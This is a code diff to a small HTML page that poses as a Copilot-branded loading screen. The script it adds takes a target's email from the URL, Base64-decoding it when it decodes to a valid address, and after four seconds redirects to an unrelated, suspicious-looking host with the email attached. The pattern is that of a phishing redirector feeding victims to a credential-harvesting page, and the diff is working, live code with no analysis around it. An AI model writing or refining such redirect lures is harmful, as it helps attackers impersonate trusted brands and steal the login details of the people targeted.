@@ -16,7 +16,7 @@
     .logo {
       width: 150px;
       height: 150px;
-      background: url(https://cloud9infosystems.com/wp-content/uploads/2024/05/copilot.jpg') no-repeat center/contain;
+      background: url('https://cloud9infosystems.com/wp-content/uploads/2024/05/copilot.jpg') no-repeat center/contain;
       animation: pulse 1.5s infinite ease-in-out;
     }
     @keyframes pulse {
@@ -30,30 +30,34 @@
   <div class="logo"></div>
 
   <script>
-    function isBase64(str) {
+    // Extract email parameter from ?email= in the current URL
+    function getEmailFromQuery() {
+      const params = new URLSearchParams(window.location.search);
+      let email = params.get("email");
+
+      if (!email) return null;
+
+      // Try to decode Base64 — if it fails, use as-is
       try {
-        return btoa(atob(str)) === str;
-      } catch (err) {
-        return false;
+        const decoded = atob(email);
+        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded)) {
+          email = decoded;
+        }
+      } catch (e) {
+        // Not Base64, leave as-is
       }
+      return email;
     }
 
-    // Get email from ?email= query param
-    const urlParams = new URLSearchParams(window.location.search);
-    let email = urlParams.get("email");
+    const email = getEmailFromQuery();
+    const baseURL = "https://06.zeacreze.com.de/AQBiHa@54cYLc58/";
 
-    if (email) {
-      // If it's Base64, decode it
-      if (isBase64(email)) {
-        email = atob(email);
-      }
-    } else {
-      email = "unknown@example.com"; // fallback
-    }
-
-    // Redirect after 4 seconds
     setTimeout(() => {
-      window.location.href = `https://06.zeacreze.com.de/AQBiHa@54cYLc58/$`;
+      if (email) {
+        window.location.href = `${baseURL}/$${encodeURIComponent(email)}`;
+      } else {
+        window.location.href = baseURL;
+      }
     }, 4000);
   </script>
 </body>
